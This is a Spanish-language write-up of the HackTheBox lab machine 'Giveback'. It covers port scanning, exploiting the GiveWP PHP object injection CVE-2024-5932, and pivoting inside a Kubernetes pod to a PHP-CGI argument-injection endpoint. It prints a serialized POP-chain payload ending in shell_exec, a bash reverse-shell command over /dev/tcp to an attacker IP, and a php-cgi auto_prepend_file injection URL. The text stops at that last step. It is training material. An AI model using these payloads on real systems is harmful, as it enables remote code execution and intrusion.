---
title: Giveback - Medium (HTB)
permalink: /Giveback-HTB-Writeup/
tags:
  - Linux
  - Medium
  - CVE-2024-5932
  - Kubernetes
  - GiveWP
  - "PHP Object Injection"
  - "PHP GCI"
  - "Kubernetes API"
  - Sudoers
  - CVE-2024-21626
  - runc
categories:
  - writeup
  - hacking
  - hackthebox
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
seo_tittle: Giveback - Medium (HTB)
seo_description: Explota CVE-2024-5932, abusa de un clúster de Kubernetes y explota CVE-2024-21626 para vencer Giveback.
excerpt: Explota CVE-2024-5932, abusa de un clúster de Kubernetes y explota CVE-2024-21626 para vencer Giveback.
header:
  overlay_image: /assets/images/headers/giveback-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/giveback-hackthebox.jpg
---
![image-center](/assets/images/posts/giveback-hackthebox.png)
{: .align-center}

**Habilidades:** CVE-2024-5932 - Unauthenticated GiveWP PHP Object Injection, Internal Services Enumeration, PHP GCI Argument Injection (RCE), Kubernetes API Server Enumeration, CVE-2024-21626 - `runc` Container Breakout [Privilege Escalation], Mount Restriction Bypass
{: .notice--primary}

# Introducción

Giveback es una máquina Linux de dificultad `Medium` en HackTheBox donde debemos comprometer un entorno basado en `Kubernetes`, donde explotaremos un par de `pods`, los cuales poseen contenedores que presentan servicios internos vulnerables, para luego enumerar la `API` en el servidor que orquesta la red de `Kubernetes`, y así obtener un secreto que nos permitirá conectarnos por `ssh`.

Una vez ganamos acceso al host, explotaremos CVE-2024-21626 en un `wrapper` restringido de `runc` para ganar acceso privilegiado al sistema.
<br>


# Reconocimiento
---
Enviaremos una traza ICMP para comprobar que la máquina víctima se encuentre activa

``` bash
ping -c1 10.129.242.171                                                               
PING 10.129.242.171 (10.129.242.171) 56(84) bytes of data.
64 bytes from 10.129.242.171: icmp_seq=1 ttl=62 time=145 ms

--- 10.129.242.171 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 144.599/144.599/144.599/0.000 ms
```


## Port Scanning 

Comenzaremos el reconocimiento activo a través de un escaneo de puertos en la máquina víctima. 

El fin de esto es descubrir servicios expuestos, los cuales con herramientas como `nmap` podemos analizar para identificar versiones y/o lanzar scripts de reconocimiento que podrían detectar alguna vulnerabilidad o realizar enumeración básica.

> En este caso podemos optar por alternativas como `rustscan`, el cual luego de reconocer los puertos abiertos en una dirección IP, es capaz de lanzar `nmap` para un escaneo dirigido a los servicios descubiertos
{: .notice--warning}

``` bash
rustscan -a 10.129.242.171 -- -sC -sV -n -Pn -oN services
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
I scanned my computer so many times, it thinks we're dating.

[~] The config file is expected to be at "/root/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 20380'.
Open 10.129.242.171:22
Open 10.129.242.171:80
Open 10.129.242.171:30686
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sC -sV -n -Pn -oN services" on ip 10.129.242.171
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2026-02-19 09:55 -03
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:55
Completed NSE at 09:55, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:55
Completed NSE at 09:55, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:55
Completed NSE at 09:55, 0.00s elapsed
Initiating SYN Stealth Scan at 09:55
Scanning 10.129.242.171 [3 ports]
Discovered open port 80/tcp on 10.129.242.171
Discovered open port 22/tcp on 10.129.242.171
Discovered open port 30686/tcp on 10.129.242.171
Completed SYN Stealth Scan at 09:55, 0.38s elapsed (3 total ports)
Initiating Service scan at 09:55
Scanning 3 services on 10.129.242.171
Completed Service scan at 09:57, 130.84s elapsed (3 services on 1 host)
NSE: Script scanning 10.129.242.171.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:57
Completed NSE at 09:57, 12.54s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:57
Completed NSE at 09:57, 3.14s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:57
Completed NSE at 09:57, 0.00s elapsed
Nmap scan report for 10.129.242.171
Host is up, received user-set (0.27s latency).
Scanned at 2026-02-19 09:55:28 -03 for 147s

PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 66f89c58f4b859bdcdec9224c3978e9e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCNmct03SP9FFs6NQ+Pih2m65SYS/Kte9aGv3C8l43TJGj2UcSrcheEX2jBL/jbje/HRafbJcGqz1bKeQo1cbAc=
|   256 96318a821a659f0aa26cff4d447cd394 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICjor5/gXrTqGEWiETEzhgoni1P2kXV3B4O2/v2SGnH0
80/tcp    open  http    syn-ack ttl 63 nginx 1.28.0
|_http-favicon: Unknown favicon MD5: 000BF649CC8F6BF27CFB04D1BCDCD3C7
|_http-server-header: nginx/1.28.0
|_http-title: GIVING BACK IS WHAT MATTERS MOST &#8211; OBVI
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-generator: WordPress 6.8.1
30686/tcp open  unknown syn-ack ttl 63
| fingerprint-strings: 
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Load-Balancing-Endpoint-Weight: 1
|     Date: Thu, 19 Feb 2026 12:55:05 GMT
|     Content-Length: 127
|     "service": {
|     "namespace": "default",
|     "name": "wp-nginx-service"
|     "localEndpoints": 1,
|     "serviceProxyHealthy": true
|   Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port30686-TCP:V=7.93%I=7%D=2/19%Time=69970854%P=x86_64-pc-linux-gnu%r(H
SF:TTPOptions,132,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\x20application/
SF:json\r\nX-Content-Type-Options:\x20nosniff\r\nX-Load-Balancing-Endpoint
SF:-Weight:\x201\r\nDate:\x20Thu,\x2019\x20Feb\x202026\x2012:55:05\x20GMT\
SF:r\nContent-Length:\x20127\r\n\r\n{\n\t\"service\":\x20{\n\t\t\"namespac
SF:e\":\x20\"default\",\n\t\t\"name\":\x20\"wp-nginx-service\"\n\t},\n\t\"
SF:localEndpoints\":\x201,\n\t\"serviceProxyHealthy\":\x20true\n}")%r(RTSP
SF:Request,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
SF:equest")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCont
SF:ent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r
SF:\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x20400\x
SF:20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nCo
SF:nnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,67,"H
SF:TTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20ch
SF:arset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Ke
SF:rberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
SF:quest")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-T
SF:ype:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400
SF:\x20Bad\x20Request")%r(LDAPSearchReq,67,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x2
SF:0close\r\n\r\n400\x20Bad\x20Request")%r(SIPOptions,67,"HTTP/1\.1\x20400
SF:\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n
SF:Connection:\x20close\r\n\r\n400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:57
Completed NSE at 09:57, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:57
Completed NSE at 09:57, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:57
Completed NSE at 09:57, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 147.99 seconds
           Raw packets sent: 3 (132B) | Rcvd: 3 (132B)
```

En este caso indicamos los argumentos de `nmap` con doble guión (`--`), donde los que lanzamos específicamente funcionan de manera que:

- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo.
- `-Pn`: Omitir el **descubrimiento de host (ARP)**.
- `-sV`: Identificar la versión del servicio.
- `-sC`: Uso de scripts de reconocimiento.
- `-oN`: Exportar la salida en formato normal.

En este caso veremos tres servicios, el `ssh` en el puerto `22`, uno `http` en el puerto `80`, además de un servicio desconocido en el puerto `30686`, el cual por su estructura parece ser `http`.

En cuanto a versiones, estos tres servicios no parecen tener vulnerabilidades explotables


## Web Enumeration

Continuaremos enumerando el servicio web que se ejecuta en el puerto `80`, el cual es un servidor `nginx`.

Antes de navegar hasta la web, opcionalmente podemos escanear las tecnologías que el servidor web utiliza, con el fin de intentar averiguar un poco más de información que `nmap` no fue capaz de analizar

``` bash
whatweb http://10.129.242.171

http://10.129.242.171 [200 OK] Bootstrap[0.3], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.28.0], IP[10.129.242.171], JQuery[3.7.1], MetaGenerator[Give v3.14.0,WordPress 6.8.1], Script[speculationrules,text/javascript], Title[GIVING BACK IS WHAT MATTERS MOST &#8211; OBVI], UncommonHeaders[link], WordPress[6.8.1], nginx[1.28.0]
```

Vemos que se trata de un CMS `Wordpress`, el cual se utiliza para gestionar el contenido de la web. Si navegamos hasta la dirección IP de la máquina, veremos la página web principal

![image-center](/assets/images/posts/giveback-1-hackthebox.png)
{: .align-center}

Antes de aplicar cualquier técnica de enumeración web (por ejemplo, `Fuzzing`), podemos centrarnos en primero analizar cómo funciona y cómo está compuesta la plataforma

El sitio web es una plataforma de donaciones, podemos convertirnos en donadores a través de `Donor Dashboard`

![image-center](/assets/images/posts/giveback-2-hackthebox.png)
{: .align-center}

Al parecer el sitio posee un dominio configurado, el cual su nombre es `giveback.htb`

![image-center](/assets/images/posts/giveback-3-hackthebox.png)
{: .align-center}

Configuraremos este nombre de dominio rápidamente en nuestro archivo `/etc/hosts` para aplicar correctamente resolución `DNS` (aunque luego me di cuenta que no era necesario)

``` bash
echo '10.129.242.171 giveback.htb' | sudo tee -a /etc/hosts

10.129.242.171 giveback.htb
```

Ahora podremos visitar este enlace que vimos, el cual nos lleva a `giveback.htb`

![image-center](/assets/images/posts/giveback-4-hackthebox.png)
{: .align-center}

Dentro del formulario de donaciones se menciona la palabra `GiveWP`, el cual perfectamente puede ser un plugin de `Wordpress`

![image-center](/assets/images/posts/giveback-5-hackthebox.png)
{: .align-center}

En el código fuente de la página principal veremos varias referencias a la palabra `Give`, la cual también aparece su versión


![image-center](/assets/images/posts/giveback-6-hackthebox.png)
{: .align-center}

Al hacer unas búsquedas en internet, encontraremos algunas vulnerabilidades que podríamos intentar explotar, además de que efectivamente se trata del plugin `GiveWP`

![image-center](/assets/images/posts/giveback-7-hackthebox.png)
{: .align-center}

### `Antrea-io`

En cuanto al puerto `30686`, solamente veremos metadatos que hacen referencia a un servicio, el cual es llamado `wp-nginx-service` y muy probablemente esté conectado al puerto `80` que ya vemos

``` bash
curl -i http://10.129.242.171:30686
HTTP/1.1 200 OK
Content-Type: application/json
X-Content-Type-Options: nosniff
X-Load-Balancing-Endpoint-Weight: 1
Date: Thu, 19 Feb 2026 13:28:44 GMT
Content-Length: 127

{
	"service": {
		"namespace": "default",
		"name": "wp-nginx-service"
	},
	"localEndpoints": 1,
	"serviceProxyHealthy": true
}#                                 
```

Haciendo unas búsquedas de los campos o de la estructura de este JSON encontramos una pista en el siguiente [`issue`](https://github.com/antrea-io/antrea/issues/6940) publicado en `Github`, la cual nos sugiere que internamente se emplea `Kubernetes`.

> `Antrea-io` es una solución de redes nativa de `Kubernetes` que implementa la Interfaz de Red de Contenedores (`CNI`) utilizando `Open vSwitch` como plano de datos.
{: .notice--info}
<br>


# Intrusión / Explotación
---
## CVE-2024-5932 - Unauthenticated GiveWP PHP Object Injection

[CVE-2024-5932](https://www.wiz.io/vulnerability-database/cve/cve-2024-5932) es una vulnerabilidad recientemente descubierta que afecta al plugin `GiveWP` para `Wordpress`, concretamente en sus versiones hasta la `3.4.11`. 

Esto permite a un atacante no autenticado inyectar un objeto `PHP` arbitrario, lo que podría derivar en una ejecución remota de comandos en el servidor

### Understanding Vulnerability

La vulnerabilidad es causada por la deserialización insegura de datos no confiables del parámetro `give_title`, lo que permite inyecciones de objetos `PHP`([`SK Shieldus`](https://www.skshieldus.com/download/files/download.do?o_fname=Research%20Technique_PHP%20Object%20Injection%20Vulnerability%20in%20WordPress%20GiveWP%20(CVE-2024-5932).pdf&r_fname=20240927174114070.pdf)).

La función `give_process_donation_form()` valida los parámetros enviados en la solicitud `HTTP` a través de la función `give_process_donation_form()`

``` php
function give_process_donation_form() {

    // Sanitize Posted Data.
    $post_data = give_clean( $_POST ); // WPCS: input var ok, CSRF ok.

    // Check whether the form submitted via AJAX or not.
    $is_ajax = isset( $post_data['give_ajax'] );

    // Verify donation form nonce.
    if ( ! give_verify_donation_form_nonce( $post_data['give-form-hash'], $post_data['give-form-id'] ) ) {
        if ( $is_ajax ) {
            /**
             * Fires when AJAX sends back errors from the donation form.
             *
             * @since 1.0
             */
            do_action( 'give_ajax_donation_errors' );
            give_die();
        } else {
            give_send_back_to_checkout();
        }
    }

    /**
     * Fires before processing the donation form.
     *
     * @since 1.0
     */
    do_action( 'give_pre_process_donation' );

    // Validate the form $_POST data.
    $valid_data = give_donation_form_validate_fields();

```

La función `give_donation_form_validate_fields()` valida si la solicitud `HTTP` contiene datos serializados llamando a la función `give_donation_form_has_serialized_fields()`

``` php
function give_donation_form_validate_fields() {

    $post_data = give_clean( $_POST ); // WPCS: input var ok, sanitization ok, CSRF ok.

    // Validate Honeypot First.
    if ( ! empty( $post_data['give-honeypot'] ) ) {
        give_set_error( 'invalid_honeypot', esc_html__( 'Honeypot field detected. Go away bad bot!', 'give' ) );
    }

    // Validate serialized fields.
    if (give_donation_form_has_serialized_fields($post_data)) {
        give_set_error('invalid_serialized_fields', esc_html__('Serialized fields detected. Go away!', 'give'));
    }

```

En la función `give_donation_form_has_serialized_fields()` solamente se chequean las claves correspondientes al array `post_data_keys` con la función `is_serialized()` de `PHP`

``` php
function give_donation_form_has_serialized_fields(array $post_data): bool
{
    $post_data_keys = [
        'give-form-id',
        'give-gateway',
        'card_name',
        'card_number',
        'card_cvc',
        'card_exp_month',
        'card_exp_year',
        'card_address',
        'card_address_2',
        'card_city',
        'card_state',
        'billing_country',
        'card_zip',
        'give_email',
        'give_first',
        'give_last',
        'give_user_login',
        'give_user_pass',
    ];

    foreach ($post_data as $key => $value) {
        if ( ! in_array($key, $post_data_keys, true)) {
            continue;
        }

        if (is_serialized($value)) {
            return true;
        }
    }

    return false;
}
```

Más abajo por la línea `1197`, podemos ver cómo la función `give_get_donation_form_user()` toma el parámetro `give_title`, el cual no se valida en la función de verificación, mientras que `give_first` y `give_last` sí

``` php
function give_get_donation_form_user( $valid_data = [] ) {
    // Initialize user.
    $user                                = false;
    $post_data                           = give_clean($_POST); // WPCS: input var ok, sanitization ok, CSRF ok.
    $is_validating_donation_form_on_ajax = ! empty($_POST['give_ajax']) ? $post_data['give_ajax'] : 0; // WPCS: input var ok, sanitization ok, CSRF ok.

...
<SNIP>
...

    // Get user first name.
    if ( ! isset( $user['user_first'] ) || strlen( trim( $user['user_first'] ) ) < 1 ) {
        $user['user_first'] = isset( $post_data['give_first'] ) ? strip_tags( trim( $post_data['give_first'] ) ) : '';
    }

    // Get user last name.
    if ( ! isset( $user['user_last'] ) || strlen( trim( $user['user_last'] ) ) < 1 ) {
        $user['user_last'] = isset( $post_data['give_last'] ) ? strip_tags( trim( $post_data['give_last'] ) ) : '';
    }

    // Add Title Prefix to user information.
    if ( empty( $user['user_title'] ) || strlen( trim( $user['user_title'] ) ) < 1 ) {
        $user['user_title'] = ! empty( $post_data['give_title'] ) ? strip_tags( trim( $post_data['give_title'] ) ) : '';
    }
```

### PHP Pop Chain

En una inyección de objetos `PHP`, un atacante no puede inyectar código `PHP` nuevo directamente, necesita usar clases que ya estén definidas, pudiendo manipular propiedades de estas para que de alguna forma terminen ejecutando código `PHP`.

> Para esto se utiliza lo que se conoce como **objetos mágicos**, los cuales son funciones especiales que definen el comportamiento durante ciertos eventos.  Por ejemplo, el método `__destruct()` se utiliza para limpiar un objeto cuando ya no se necesita.
{: .notice--info}

Para una mayor comprensión de la inyección de objetos `PHP`, podemos consultar el [siguiente post](https://www.wordfence.com/blog/2024/08/4998-bounty-awarded-and-100000-wordpress-sites-protected-against-unauthenticated-remote-code-execution-vulnerability-patched-in-givewp-wordpress-plugin/).

Una vez ya más o menos entendemos la lógica que hay durante la inyección de objetos `PHP`, podremos comprender más o menos cómo funciona el `payload` que utiliza la siguiente [prueba de concepto](https://github.com/EQSTLab/CVE-2024-5932) publicada por `EQSTLab`

``` php
O:19:"Stripe\\\\\\\\StripeObject":1:{s:10:"\\0*\\0_values";a:1:{s:3:"foo";O:62:"Give\\\\\\\\PaymentGateways\\\\\\\\DataTransferObjects\\\\\\\\GiveInsertPaymentData":1:{s:8:"userInfo";a:1:{s:7:"address";O:4:"Give":1:{s:12:"\\0*\\0container";O:33:"Give\\\\\\\\Vendors\\\\\\\\Faker\\\\\\\\ValidGenerator":3:{s:12:"\\0*\\0validator";s:10:"shell_exec";s:12:"\\0*\\0generator";O:34:"Give\\\\\\\\Onboarding\\\\\\\\SettingsRepository":1:{s:11:"\\0*\\0settings";a:1:{s:8:"address1";s:%d:"command";}}s:13:"\\0*\\0maxRetries";i:10;}}}}}}
```

Al procesar el objeto `PHP`, el plugin realizará la siguiente operación, permitiendo ejecutar un comando a través del valor de `address1`

``` php
shell_exec(settings['address1']);
```

### Exploiting

Prepararemos un entorno virtual para poder ejecutar la [prueba de concepto](https://github.com/EQSTLab/CVE-2024-5932)

``` bash
uv venv                              
source .venv/bin/activate
uv pip install -r requirements.txt
```

> Iniciaremos un listener en nuestra máquina por un puerto, en mi caso el `443`: `nc -lvnp 443`.
{: .notice--warning}

Finalmente lanzaremos un comando que envíe una reverse shell hacia nuestra dirección IP por el puerto que tenemos a la escucha

``` bash
uv run CVE-2024-5932-rce.py -u http://giveback.htb/donations/the-things-we-need/ -c "bash -c 'bash -i >& /dev/tcp/10.10.16.8/443 0>&1'"
```


## Shell as `?` in `beta-vino-wp-wordpress` Container 

Desde nuestro listener recibiremos una consola de bash, donde la cuenta que la ha enviado no posee una entrada en `/etc/passwd`.

Por lo que en vez del nombre de usuario vemos el mensaje `I have no name!`

~~~ bash
nc -lvnp 443                                       
Connection from 10.129.126.67:13827
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
<-5bcf94547b-xh5hp:/opt/bitnami/wordpress/wp-admin$
~~~

Si intentamos ver qué usuario somos, no será posible resolver nuestro `uid`, aunque pertenecemos al grupo `root`

``` bash
I have no name!@beta-vino-wp-wordpress-64fdd946fc-7hm5l:/opt/bitnami/wordpress/wp-admin$ id
uid=1001 gid=0(root) groups=0(root),1001

I have no name!@beta-vino-wp-wordpress-64fdd946fc-7hm5l:/opt/bitnami/wordpress/wp-admin$ whoami
whoami: cannot find name for user ID 1001
```

### TTY Treatment

Haremos un tratamiento de la consola para poder hacerla más interactiva a través de una pseudo-consola

``` bash
<-5bcf94547b-xh5hp:/opt/bitnami/wordpress/wp-admin$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
<-5bcf94547b-xh5hp:/opt/bitnami/wordpress/wp-admin$ ^Z
[1]  + 5513 suspended  nc -lvnp 443
root@HackBookPro nmap # stty raw -echo;fg        
[1]  + 5513 continued  nc -lvnp 443
                                   reset xterm
<-5bcf94547b-xh5hp:/opt/bitnami/wordpress/wp-admin$ export TERM=xterm
```

De esta forma, podremos presionar `Ctrl+C` sin que muera nuestra shell, además de `Ctrl+L` para limpiar la pantalla gracias a la variable `TERM`

El último paso consiste en ajustar las proporciones de nuestra terminal en la máquina víctima, desde nuestra máquina las podemos ver con el comando `stty size`

``` bash
# Example: $ stty size 
# 44 184

<-5bcf94547b-xh5hp:/opt/bitnami/wordpress/wp-admin$ stty rows 44 columns 184
```


## Internal Services Enumeration

En este momento nos encontramos dentro de un sistema el cual no es la máquina víctima final, sino dentro de un contenedor, podemos averiguarlo por la pista del `hostname` y la dirección IP de las interfaces de red

``` bash
I have no name!@beta-vino-wp-wordpress-768b9f946c-pfn65:/opt/bitnami/wordpress/wp-admin$ hostname -I
10.42.1.249 
```

Optaremos por buscar vías potenciales de escape a través de enumeración a la red, servicios internos, configuraciones, etc.

### `Kubernetes` 

Al enumerar las variables de entorno, veremos algunas que hacen referencia a un servicio de `Kubernetes` en una IP por el puerto `443`, el cual comúnmente es el puerto por defecto que utiliza el `API Server`.

> `Kubernetes` (`K8s`) es una plataforma de código abierto diseñada para automatizar el despliegue, escalado y gestión de aplicaciones en contenedores (como lo hace por ejemplo, `Docker`).
{: .notice--info}

``` bash
I have no name!@beta-vino-wp-wordpress-798c984d4b-nv2x4:/opt/bitnami/wordpress/wp-admin$ env | grep KUBERNETES
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_SERVICE_PORT=443
KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443
KUBERNETES_PORT_443_TCP_PROTO=tcp
KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1
KUBERNETES_SERVICE_HOST=10.43.0.1
KUBERNETES_PORT=tcp://10.43.0.1:443
KUBERNETES_PORT_443_TCP_PORT=443
```

Como se emplea `kubernetes`, entonces podemos concluir que estamos dentro de un clúster. 

Podemos consultar información más técnica en la [documentación oficial](https://kubernetes.io/docs/concepts/architecture/) para entender el entorno `Kubernetes`

### Custom Internal Service

Dentro de las variables de entorno también veremos algunas llamadas `LEGACY_INTRANET_SERVICE_HOST/PORT`, las cuales hacen referencia a una dirección IP dentro de la red

``` bash
I have no name!@beta-vino-wp-wordpress-85647fcd77-4tl55:/opt/bitnami/wordpress/wp-admin$ env

...
<SNIP>
...
WORDPRESS_ENABLE_REVERSE_PROXY=no
LEGACY_INTRANET_SERVICE_PORT=tcp://10.43.2.241:5000
WORDPRESS_SMTP_USER=
WEB_SERVER_TYPE=apache
WORDPRESS_MULTISITE_HOST=
PHP_DEFAULT_MEMORY_LIMIT=512M
WORDPRESS_OVERRIDE_DATABASE_SETTINGS=no
WORDPRESS_DATABASE_SSL_CA_FILE=
OS_ARCH=amd64
WEB_SERVER_DAEMON_USER=daemon
BETA_VINO_WP_WORDPRESS_PORT_80_TCP_ADDR=10.43.61.204
BETA_VINO_WP_MARIADB_SERVICE_HOST=10.43.147.82
_=/usr/bin/env
```

Probablamente se trate de un sitio web interno, por lo que intentaremos enviar solicitudes hacia él

### HTTP Requests without `curl` Command

Nos encontraremos con el inconveniente de al ser un contenedor, normalmente no tenemos disponibles binarios como `curl` o `wget` para enviar solicitudes `HTTP`

``` bash
I have no name!@beta-vino-wp-wordpress-768b9f946c-pfn65:/opt/bitnami/wordpress/wp-admin$ which curl 
I have no name!@beta-vino-wp-wordpress-768b9f946c-pfn65:/opt/bitnami/wordpress/wp-admin$ which wget
```

En consecuencia, acudiremos a un socket `TCP` para enviar conexiones a través de una función, como se explica en esta discusión de [`Stack Exchange`](https://unix.stackexchange.com/questions/83926/how-to-download-a-file-using-just-bash-and-nothing-else-no-curl-wget-perl-et/83927#83927).

> Esta función hace uso de un socket de red usando la ruta especial `/dev/tcp`.
{: .notice--warning}

Pegaremos la siguiente función directamente en la consola del contenedor para definirla en la sesión actual

``` bash
function __curl() {
  read -r proto server path <<<"$(printf '%s' "${1//// }")"
  if [ "$proto" != "http:" ]; then
    printf >&2 "sorry, %s supports only http\n" "${FUNCNAME[0]}"
    return 1
  fi
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [ "${HOST}" = "${PORT}" ] && PORT=80

  exec 3<>"/dev/tcp/${HOST}/$PORT"
  printf 'GET %s HTTP/1.0\r\nHost: %s\r\n\r\n' "${DOC}" "${HOST}" >&3
  (while read -r line; do
   [ "$line" = $'\r' ] && break
  done && cat) <&3
  exec 3>&-
}
```

Esta función de `bash` debería darnos la capacidad de ejecutar una solicitud `HTTP` (al menos el método `GET`) hacia el servicio `LEGACY_INTRANET_SERVICE`

``` bash
I have no name!@beta-vino-wp-wordpress-85647fcd77-4tl55:/opt/bitnami/wordpress/wp-admin$ __curl http://10.43.2.241:5000
<!DOCTYPE html>
<html>
<head>
  <title>GiveBack LLC Internal CMS</title>
  <!-- Developer note: phpinfo accessible via debug mode during migration window -->
  <style>
    body { font-family: Arial, sans-serif; margin: 40px; background: #f9f9f9; }
    .header { color: #333; border-bottom: 1px solid #ccc; padding-bottom: 10px; }
    .info { background: #eef; padding: 15px; margin: 20px 0; border-radius: 5px; }
    .warning { background: #fff3cd; border: 1px solid #ffeeba; padding: 10px; margin: 10px 0; }
    .resources { margin: 20px 0; }
    .resources li { margin: 5px 0; }
    a { color: #007bff; text-decoration: none; }
    a:hover { text-decoration: underline; }
  </style>
</head>
<body>
  <div class="header">
    <h1>🏢 GiveBack LLC Internal CMS System</h1>
    <p><em>Development Environment – Internal Use Only</em></p>
  </div>

  <div class="warning">
    <h4>⚠️ Legacy Notice</h4>
    <p>**SRE** - This system still includes legacy CGI support. Cluster misconfiguration may likely expose internal scripts.</p>
  </div>

  <div class="resources">
    <h3>Internal Resources</h3>
    <ul>
      <li><a href="/admin/">/admin/</a> — VPN Required</li>
      <li><a href="/backups/">/backups/</a> — VPN Required</li>
      <li><a href="/runbooks/">/runbooks/</a> — VPN Required</li>
      <li><a href="/legacy-docs/">/legacy-docs/</a> — VPN Required</li>
      <li><a href="/debug/">/debug/</a> — Disabled</li>
      <li><a href="/cgi-bin/info">/cgi-bin/info</a> — CGI Diagnostics</li>
      <li><a href="/cgi-bin/php-cgi">/cgi-bin/php-cgi</a> — PHP-CGI Handler</li>
      <li><a href="/phpinfo.php">/phpinfo.php</a></li>
      <li><a href="/robots.txt">/robots.txt</a> — Crawlers: Disallowed</li>
    </ul>
  </div>

  <div class="info">
    <h3>Developer Note</h3>
    <p>This CMS was originally deployed on Windows IIS using <code>php-cgi.exe</code>.
    During migration to Linux, the Windows-style CGI handling was retained to ensure
    legacy scripts continued to function without modification.</p>
  </div>
</body>
</html>
```


## PHP GCI Argument Injection (Like CVE-2024-4577, CVE-2012-1823 or CVE-2012-2311)

> `PHP CGI` es un ejecutable que permite a un servidor web (como `Apache` o `Nginx`) procesar scripts `PHP` utilizando el protocolo `Common Gateway Interface` (`CGI`).
{: .notice--info}

Luego de probar con las rutas disponibles dentro de este servicio interno, notaremos que podemos interactuar con el endpoint `/cgi-bin/php-cgi`

``` bash
I have no name!@beta-vino-wp-wordpress-798c984d4b-nv2x4:/opt/bitnami/wordpress/wp-admin$ __curl http://10.43.2.241:5000/cgi-bin/php-cgi; echo
OK
```

Si nunca hemos explotado `PHP CGI`, podemos encontrar algún que otro ejemplo publicado en internet con alguna que otra prueba de concepto

![image-center](/assets/images/posts/giveback-8-hackthebox.png)
{: .align-center}

Al enviar una solicitud `HTTP` `GET` al servidor web, éste nos devolverá un error de sintaxis `PHP`, donde nos da una pista de cómo está operando `PHP CGI` por detrás

``` bash
I have no name!@beta-vino-wp-wordpress-64fdd946fc-7hm5l:/opt/bitnami/wordpress/wp-admin$ __curl "http://10.43.2.241:5000/cgi-bin/php-cgi?-d+allow_url_include=1+-d+auto_prepend_file=php://input"
[START]<br />
<b>Fatal error</b>:  Uncaught ValueError: passthru(): Argument #1 ($command) cannot be empty in /var/www/html/cgi-bin/php-cgi:25
Stack trace:
#0 /var/www/html/cgi-bin/php-cgi(25): passthru('')
#1 {main}
